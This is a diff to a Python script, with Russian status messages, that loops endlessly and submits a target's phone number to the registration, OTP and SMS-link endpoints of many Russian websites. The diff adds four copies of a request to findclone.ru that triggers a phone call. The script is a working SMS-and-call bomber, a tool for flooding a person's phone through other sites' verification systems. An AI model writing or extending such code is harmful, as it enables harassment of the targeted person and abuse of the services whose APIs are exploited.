@@ -110,6 +110,12 @@ while True:
 		print('[-] Не отправлено!')
 
 	try:
+		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
+		print('[+] findclone звонок отправлен!')
+	except:
+		print('[-] Не отправлено!')
+
+	try:
 		requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
 		print('[+] oyorooms отправлено!')
 	except:
@@ -224,6 +230,12 @@ while True:
 		print('[-] Не отправлено!')
 
 	try:
+		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
+		print('[+] findclone звонок отправлен!')
+	except:
+		print('[-] Не отправлено!')
+
+	try:
 		requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": _phone})
 		print('[+] Pmsm отправлено!')
 	except:
@@ -274,6 +286,12 @@ while True:
 	try:
 		requests.post("http://smsgorod.ru/sendsms.php",data={"number": _phone})
 		print('[+] SMSgorod отправлено!')
+	except:
+		print('[-] Не отправлено!')
+
+	try:
+		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
+		print('[+] findclone звонок отправлен!')
 	except:
 		print('[-] Не отправлено!')
 
@@ -364,6 +382,12 @@ while True:
 	try:
 		requests.post('https://www.stoloto.ru/send-mobile-app-link', data={"phone": _phone})
 		print('[+] stoloto отправлено!')
+	except:
+		print('[-] Не отправлено!')
+
+	try:
+		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
+		print('[+] findclone звонок отправлен!')
 	except:
 		print('[-] Не отправлено!')
 
